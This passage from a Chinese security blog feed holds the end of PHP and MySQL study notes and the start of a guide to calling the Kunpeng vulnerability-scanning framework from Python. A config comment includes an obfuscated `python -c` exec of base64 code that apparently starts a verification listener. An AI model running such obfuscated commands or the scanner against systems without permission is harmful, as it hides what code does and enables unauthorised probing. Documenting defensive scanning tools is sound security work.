class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> PI=<span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">S</span><span class="params">($r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> MyClass::PI;</span><br><span class="line">MyClass::S(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> MyClass();</span><br><span class="line">$s-&gt;S(<span class="number">10</span>);</span><br></pre></td></tr></table></figure></p><p>两个冒号(::)是对类中的方法的静态引用<br>也就是不需要实例化对象,直接直接使用MyClass::PI 来取得PI的值<br>静态方法调用也同理MyClass::S(5); 直接调用静态方法S()</p><p>-&gt;<br>先实例化这个对象<br>在使用-&gt;调用里面的方法</p><h4 id="可变参数列表"><a href="#可变参数列表" class="headerlink" title="可变参数列表"></a>可变参数列表</h4><p>自定义函数接受自定义个数的参数列表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $numargs=func_get_args();</span><br><span class="line">    <span class="keyword">foreach</span> ($numargs <span class="keyword">as</span> $args) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $args,<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">(...$args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($args <span class="keyword">as</span> $arg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $arg,<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><h4 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $one=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_one</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;one;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A;</span><br><span class="line">$s=serialize($a);</span><br><span class="line">file_put_contents(<span class="string">'a.txt'</span>,$s);</span><br><span class="line"></span><br><span class="line">$s=file_get_contents(<span class="string">'a.txt'</span>);</span><br><span class="line">$a=unserialize($s);</span><br><span class="line">$a-&gt;show_one();</span><br></pre></td></tr></table></figure><h3 id="mysql相关操作"><a href="#mysql相关操作" class="headerlink" title="mysql相关操作"></a>mysql相关操作</h3><p>php操作MySQL的三种方式：</p><ul><li>MySQL：非永久连接，性能比较低，PHP5.5以后被废弃</li><li>MySQLi：永久连接，减轻服务器压力</li><li>PDO：能实现MySQLi的常用功能，支持大部分数据库</li></ul><p>php扩展查看函数：phpinfo() </p><h4 id="MySQL方连接数据库"><a href="#MySQL方连接数据库" class="headerlink" title="MySQL方连接数据库"></a>MySQL方连接数据库</h4><ol><li><p>连接数据库<br>mysql_connect($server, $username, $password)<br>等同于数据库操作mysql -uroot -p123456;</p></li><li><p>选择数据库<br>mysql_select_db($database_name)<br>等同于use db;</p></li><li><p>设置字符集<br>mysql_set_charset($charset)<br>等同于 set names utf8;</p></li></ol><h4 id="MySQL执行SQL语句"><a href="#MySQL执行SQL语句" class="headerlink" title="MySQL执行SQL语句"></a>MySQL执行SQL语句</h4><p>mysql_query($query)<br>对insert/update/delete/drop之类进行操作，执行成功返回true失败返回false</p><h4 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#连接数据库</span><br><span class="line">mysql -hlocalhost -P 6606 -uroot -proot</span><br><span class="line"># 查看数据库</span><br><span class="line">show databases;</span><br><span class="line"># 创建数据库</span><br><span class="line">create database [if not exists] db_name [default character set &apos;utf8&apos;];</span><br><span class="line">        if not exists 检测数据库是否存在，如果不存在则创建</span><br><span class="line">        </span><br><span class="line"># 查看上一步操作产生的警告信息</span><br><span class="line">show warnings;</span><br><span class="line"># 查看指定数据库的详细信息</span><br><span class="line">show create database vuldb;</span><br><span class="line"></span><br><span class="line"># 修改指定数据库的编码方式</span><br><span class="line">alter database vuldb default character set &apos;utf8&apos;</span><br><span class="line"># 选择数据库</span><br><span class="line">use vuldb;</span><br><span class="line">#</span><br><span class="line">select database()  查看当前打开的数据库</span><br><span class="line">select user()  查看登陆用户</span><br><span class="line">select version() 查看数据库的版本信息</span><br><span class="line">select now()  查看当前的日期时间</span><br><span class="line">#创建表others</span><br><span class="line">mysql&gt; create table others(</span><br><span class="line">    -&gt; id int primary key auto_increment,</span><br><span class="line">    -&gt; name varchar(20),</span><br><span class="line">    -&gt; money int);</span><br><span class="line"></span><br><span class="line">#删除指定数据库</span><br><span class="line">drop database [if exists] db_name;</span><br></pre></td></tr></table></figure><h4 id="数据表操作"><a href="#数据表操作" class="headerlink" title="数据表操作"></a>数据表操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">数据表由行（row)和列（column)组成</span><br><span class="line">每个数据表中至少要有一列</span><br><span class="line">表明要求唯一</span><br><span class="line"># 创建表</span><br><span class="line">create table [if not exists] tbl_name(</span><br><span class="line">    字段名称 字段类型 [完整性约束条件],</span><br><span class="line">    字段名称 字段类型 [完整性约束条件],</span><br><span class="line">    字段名称 字段类型 [完整性约束条件]</span><br><span class="line">    ...</span><br><span class="line">    )engine=存储引擎 charset=编码方式;</span><br><span class="line">    </span><br><span class="line">    # 完整性约束条件</span><br><span class="line">    unsigned 无符号，从0开始，没有负数</span><br><span class="line">    zerofill   零填充，当数据长度不够时，使用补0的效果填充至指定长度</span><br><span class="line">     not null 非空约束</span><br><span class="line">     default    默认值</span><br><span class="line">     primary key 主键，标识记录的唯一值，值不能重复，一个表只能有一个主键</span><br><span class="line">     unique key 唯一值，一个表中可以有多个字段是唯一索引，值不能重复，null除外</span><br><span class="line">     auto_increment 自动增长，只能用于数值列</span><br><span class="line">     foreign key    外键约束</span><br><span class="line">    </span><br><span class="line"># 查看当前数据库下已有的数据表</span><br><span class="line">show tables;</span><br><span class="line"># 查看指定数据表的详细信息</span><br><span class="line">show create table tbl_name;</span><br><span class="line">#查看表结构</span><br><span class="line">desc tbl_name;</span><br><span class="line"># 删除指定的数据表</span><br><span class="line">drop table if exists tbl_name;</span><br><span class="line"># 表结构相关操作</span><br><span class="line">    # 添加字段</span><br><span class="line">    alter table tbl_name add 字段名称 字段属性 [完整性约束条件]</span><br><span class="line">    # 删除字段</span><br><span class="line">    alter table tbl_name drop 字段名称</span><br></pre></td></tr></table></figure><h4 id="MySQL事务和锁"><a href="#MySQL事务和锁" class="headerlink" title="MySQL事务和锁"></a>MySQL事务和锁</h4><p><strong>事务</strong><br>事务是一条或者多条数据库操作语句组合<br>事务处理可以用来维护数据库的完整性，事务必须满足4个特性ACID</p><ul><li>atomicity原子性：一组事务，要么全部成功，要么撤回</li><li>consistency一致性：数据库正确的改变状态后，数据库的一致性约束没有被破坏</li><li>isolation隔离性：事务之间独立，互不干扰</li><li>durability持久性：事务的提交结果，将持久保存在数据库中<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 在默认情况下，MySQL每执行一条SQL语句，都是一个单独的事务</span><br><span class="line">2. MySQL命令行默认设置下，事物都是自动提交的，即对于独立的每条sql语句，MySQL都是自动<span class="keyword">commit</span>或者回滚</span><br><span class="line"><span class="number">3.</span> 如果要执行多条<span class="keyword">sql</span>语句组成的事务，使用命令<span class="keyword">begin</span>或者<span class="keyword">start</span> <span class="keyword">transaction</span>开始事务，使用<span class="keyword">commit</span>或<span class="keyword">rollback</span>结束事务</span><br><span class="line"><span class="number">4.</span> 在<span class="keyword">innodb</span>存储引擎的事务中，对于<span class="keyword">update</span>、<span class="keyword">delete</span>和<span class="keyword">insert</span>语句，会自动给涉及数据行加排他锁</span><br></pre></td></tr></table></figure></li></ul><h4 id="MySQL数据操作"><a href="#MySQL数据操作" class="headerlink" title="MySQL数据操作"></a>MySQL数据操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">插入记录</span><br><span class="line"># 不指定字段名称</span><br><span class="line">insert tbl_name value(值,...);</span><br><span class="line"># 指定字段名称</span><br><span class="line">insert tbl_name(字段名称,...) value(值,...);</span><br><span class="line"># 一次插入多条记录</span><br><span class="line">insert tbl_name[(字段名称,...)] values(值,...),(值,...),(值,...);</span><br><span class="line"></span><br><span class="line">修改记录</span><br><span class="line">update tbl_name set 字段名称=值,... [where 条件]</span><br><span class="line">注意添加where条件，如果不添加条件，整个表中的记录都会被更新</span><br><span class="line"></span><br><span class="line">删除记录</span><br><span class="line">delete from tbl_name [where 条件]</span><br><span class="line">注意如果不添加where条件，整个表中的记录都会被删除</span><br><span class="line"></span><br><span class="line">查询记录</span><br><span class="line">select * from tbl_name </span><br><span class="line">[where 条件&#123;like 匹配字符 % 任意长度字符串 _ 任意一个字符&#125;]</span><br><span class="line">[group by &#123;col_name|position&#125; HAVING 二次筛选 分组]</span><br><span class="line">[order by &#123;col_name|position|expr&#125;[asc|desc] 排序]</span><br><span class="line">[limit 限制结果集的显示条数]</span><br><span class="line"></span><br><span class="line"># group by 分组</span><br><span class="line">把值相同放到同一个组中，最终查询的结果只会显示组中的一条记录</span><br><span class="line">分组配置group_concat()函数查看组中某个字段的详细信息</span><br><span class="line">配合聚合函数使用</span><br><span class="line">    count() sum() max() min() avg()    </span><br><span class="line"></span><br><span class="line">-- 按照sex分组，得到用户名详情，并且分组中的总人数</span><br><span class="line">select sex, group_concat(username) as usersDetail, count(*) as totalUsers from tbl_name group by sex;</span><br><span class="line"></span><br><span class="line">having 子句对分组结果进行二次筛选，（等同意where进行第一次筛选）</span><br><span class="line">-- 查询按照addr分组，并对于分组结果进行二次筛选，条件是组中人数 &gt;=3</span><br><span class="line">select addr, </span><br><span class="line">group_concat(username) as userDetail,</span><br><span class="line">count(*) as totalUsers,</span><br><span class="line">from tbl_name</span><br><span class="line">group by addr</span><br><span class="line">having count(*)&gt;=3;</span><br><span class="line"></span><br><span class="line"># order by 排序</span><br><span class="line">order by 字段名称 asc|desc | rand() 默认升序asc</span><br><span class="line">-- 按照多个字段排序</span><br><span class="line">select id, username, age</span><br><span class="line">from tbl_name </span><br><span class="line">order by age asc, id asc;</span><br><span class="line"></span><br><span class="line"># limit 限制结果集显示条数</span><br><span class="line">主要用于分页</span><br><span class="line">--显示结果集的前5条记录</span><br><span class="line">select id, username, age, sex </span><br><span class="line">from tbl_name</span><br><span class="line">limit 0,5;   --0 偏移量，从0开始</span><br><span class="line"></span><br><span class="line">多表查询</span><br><span class="line">笛卡尔积的形式（不推荐）</span><br><span class="line">内连接形式**</span><br><span class="line">    查询两个表中符合连接条件的记录</span><br><span class="line">    select 字段名称,... from tbl_name1</span><br><span class="line">    [inner] join tbl_name2</span><br><span class="line">    on 连接条件</span><br><span class="line">    -- 测试</span><br><span class="line">    select e.id, e.username, e.age, d.depName</span><br><span class="line">    from emp as e</span><br><span class="line">    [inner] join dep as d</span><br><span class="line">    on e.depID=d.id</span><br><span class="line">外连接形式(会把主表的记录全部显示出来)</span><br><span class="line">#左外连接</span><br><span class="line">先显示左表中的全部记录，再去右表中查询符合条件的记录，不符合以null代替</span><br><span class="line">select 字段名称,... from tbl_name1</span><br><span class="line">left [outer] join tbl_name2</span><br><span class="line">on 连接条件</span><br><span class="line">#右外连接</span><br><span class="line">先显示右表中的全部记录，再去左表中查询符合条件的记录，不符合以null代替</span><br><span class="line">select 字段名称,... from tbl_name1</span><br><span class="line">right [outer] join tbl_name2</span><br><span class="line">on 连接条件</span><br></pre></td></tr></table></figure><p>实际操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、连接数据库</span></span><br><span class="line">$link = @mysql_connect(<span class="string">'localhost:6606'</span>,root,root) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'数据库连接失败'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、选择数据库</span></span><br><span class="line">mysql_select_db(<span class="string">'vuldb'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'选择数据库不存在'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、设置字符集</span></span><br><span class="line">mysql_set_charset(<span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="comment">//$result=mysql_query("INSERT INTO others VALUES(NULL ,'张胜',100)");</span></span><br><span class="line"><span class="comment">//var_dump($result);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//更新数据</span></span><br><span class="line"><span class="comment">//$result=mysql_query("update others set money=10 where id=1");</span></span><br><span class="line"><span class="comment">//var_dump($result);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除单条数据</span></span><br><span class="line"><span class="comment">//$result=mysql_query("delete from others where id=2");</span></span><br><span class="line"><span class="comment">//var_dump($result);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除数据表</span></span><br><span class="line"><span class="comment">//$result=mysql_query("drop table test1");</span></span><br><span class="line"><span class="comment">//var_dump($result);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询</span></span><br><span class="line">$result=mysql_query(<span class="string">"select * from others"</span>);</span><br><span class="line"><span class="comment">//$line=mysql_fetch_row($result);  //返回一个索引数组</span></span><br><span class="line"><span class="comment">//$line=mysql_fetch_assoc($result);   //返回一个关联数组</span></span><br><span class="line"><span class="keyword">while</span>($line=mysql_fetch_array($result,MYSQL_ASSOC))&#123;</span><br><span class="line">    $data[]=$line;</span><br><span class="line">&#125; <span class="comment">//三个参数，默认MYSQL_BOTH返回关联索引数组,MYSQL_ASSOC返回关联数组,MYSQL_NUM返回索引数组</span></span><br><span class="line">var_dump($data);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭数据库</span></span><br><span class="line">@mysql_close($link);</span><br></pre></td></tr></table></figure></p><h3 id="MySQLi面向过程方式操作数据库"><a href="#MySQLi面向过程方式操作数据库" class="headerlink" title="MySQLi面向过程方式操作数据库"></a>MySQLi面向过程方式操作数据库</h3><ol><li><p>连接数据库<br>$connect=mysqli_connect(‘host’,’username’,’password’,’database’);</p></li><li><p>执行SQL语句<br>$result=mysqli_query($connect,$sql);</p></li><li><p>获取结果集<br>mysqli_fetch_all($result)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$conn=mysqli_connect(<span class="string">'localhost:6606'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'vuldb'</span>);</span><br><span class="line">mysqli_query($conn,<span class="string">'set names utf8'</span>);</span><br><span class="line">$sql=<span class="string">'select * from others'</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">$data=mysqli_fetch_all($result,MYSQLI_ASSOC); <span class="comment">//MYSQLI_ASSOC返回索引数组</span></span><br><span class="line">var_dump($data);</span><br><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;印象笔记中躺着一篇当时学PHP的一篇笔记，贴出来，从慕课网上学的&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.php.net/manual/zh/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHP官方手册&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看代码还是直接查手册吧&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="编程基础" scheme="http://www.pa55w0rd.club/tags/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>开源POC检测框架Kunpeng使用</title>
    <link href="http://www.pa55w0rd.club/kunpeng/"/>
    <id>http://www.pa55w0rd.club/kunpeng/</id>
    <published>2019-03-22T10:03:41.000Z</published>
    <updated>2019-04-03T06:11:35.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>项目地址：<a href="https://github.com/opensec-cn/kunpeng" target="_blank" rel="noopener">https://github.com/opensec-cn/kunpeng</a></p><p>Kunpeng是一个Golang编写的开源POC检测框架，集成了包括数据库、中间件、web组件、cms等等的漏洞POC（查看已收录POC列表），可检测弱口令、SQL注入、XSS、RCE等漏洞类型，以动态链接库的形式提供调用，通过此项目可快速对目标进行安全漏洞检测，比攻击者快一步发现风险漏洞。<br><a id="more"></a><br>运行环境：Windows，Linux，Darwin</p><p>工作形态：动态链接库，so、dll、dylib、go plugin</p><h2 id="0x01-使用"><a href="#0x01-使用" class="headerlink" title="0x01 使用"></a>0x01 使用</h2><p>环境:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">windows10</span></span><br><span class="line"><span class="selector-tag">python3</span><span class="selector-class">.7</span></span><br><span class="line"><span class="selector-tag">kunpeng_c</span><span class="selector-class">.dll</span></span><br></pre></td></tr></table></figure></p><p>源码地址：<a href="https://github.com/Pa55w0rd/Kunpeng-use-Python3" target="_blank" rel="noopener">https://github.com/Pa55w0rd/Kunpeng-use-Python3</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_args_encode</span><span class="params">(args_string)</span>:</span></span><br><span class="line">    <span class="string">'''Encode by utf-8 in PY3.'''</span></span><br><span class="line">    <span class="keyword">if</span> sys.version_info &gt;= (<span class="number">3</span>, <span class="number">0</span>):</span><br><span class="line">        args_string = args_string.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> args_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载动态连接库</span></span><br><span class="line">kunpeng = cdll.LoadLibrary(<span class="string">'./kunpeng_c.dll'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义出入参变量类型</span></span><br><span class="line">kunpeng.GetPlugins.restype = c_char_p</span><br><span class="line">kunpeng.Check.argtypes = [c_char_p]</span><br><span class="line">kunpeng.Check.restype = c_char_p</span><br><span class="line">kunpeng.SetConfig.argtypes = [c_char_p]</span><br><span class="line">kunpeng.GetVersion.restype = c_char_p</span><br><span class="line"></span><br><span class="line">print(kunpeng.GetVersion())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取插件信息</span></span><br><span class="line">out = kunpeng.GetPlugins()</span><br><span class="line"><span class="comment"># print(out)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置</span></span><br><span class="line">config = &#123;</span><br><span class="line">    <span class="string">'timeout'</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="comment"># 'aider': 'http://x<span class="doctag">xxx:</span>8080', # 漏洞辅助验证接口，部分漏洞无法通过回显判断是否存在漏洞，可通过辅助验证接口进行判断。python -c'import socket,base64;exec(base64.b64decode("aGlzdG9yeSA9IFtdCndlYiA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQp3ZWIuYmluZCgoJzAuMC4wLjAnLDgwODgpKQp3ZWIubGlzdGVuKDEwKQp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIGNvbm4sYWRkciA9IHdlYi5hY2NlcHQoKQogICAgICAgIGRhdGEgPSBjb25uLnJlY3YoNDA5NikKICAgICAgICByZXFfbGluZSA9IGRhdGEuc3BsaXQoIlxyXG4iKVswXQogICAgICAgIGFjdGlvbiA9IHJlcV9saW5lLnNwbGl0KClbMV0uc3BsaXQoJy8nKVsxXQogICAgICAgIHJhbmtfc3RyID0gcmVxX2xpbmUuc3BsaXQoKVsxXS5zcGxpdCgnLycpWzJdCiAgICAgICAgaHRtbCA9ICJORVcwMCIKICAgICAgICBpZiBhY3Rpb24gPT0gImFkZCI6CiAgICAgICAgICAgIGhpc3RvcnkuYXBwZW5kKHJhbmtfc3RyKQogICAgICAgICAgICBwcmludCAiYWRkIityYW5rX3N0cgogICAgICAgIGVsaWYgYWN0aW9uID09ICJjaGVjayI6CiAgICAgICAgICAgIHByaW50ICJjaGVjayIrcmFua19zdHIKICAgICAgICAgICAgaWYgcmFua19zdHIgaW4gaGlzdG9yeToKICAgICAgICAgICAgICAgIGh0bWw9IlZVTDAwIgogICAgICAgICAgICAgICAgaGlzdG9yeS5yZW1vdmUocmFua19zdHIpCiAgICAgICAgcmF3ID0gIkhUVFAvMS4wIDIwMCBPS1xyXG5Db250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLThcclxuQ29udGVudC1MZW5ndGg6ICVkXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4lcyIgJShsZW4oaHRtbCksaHRtbCkKICAgICAgICBjb25uLnNlbmQocmF3KQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgZXhjZXB0OnBhc3M="))' 在辅助验证机器上运行以上代码，填入http://IP:8088，不开启则留空。</span></span><br><span class="line">    <span class="comment"># 'http_proxy': 'http://xx<span class="doctag">xxx:</span>1080',</span></span><br><span class="line">    <span class="comment"># 'pass_list':['xtest'] // 默认密码字典，不定义则使用硬编码在代码里的小字典</span></span><br><span class="line">    <span class="comment"># 'extra_plugin_path': '/home/test/plugin/', //除已编译好的插件（Go、JSON）外，可指定额外插件目录（仅支持JSON插件），指定后程序会周期读取加载插件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conf_args = json.dumps(config)</span><br><span class="line">kunpeng.SetConfig(_args_encode(conf_args))</span><br><span 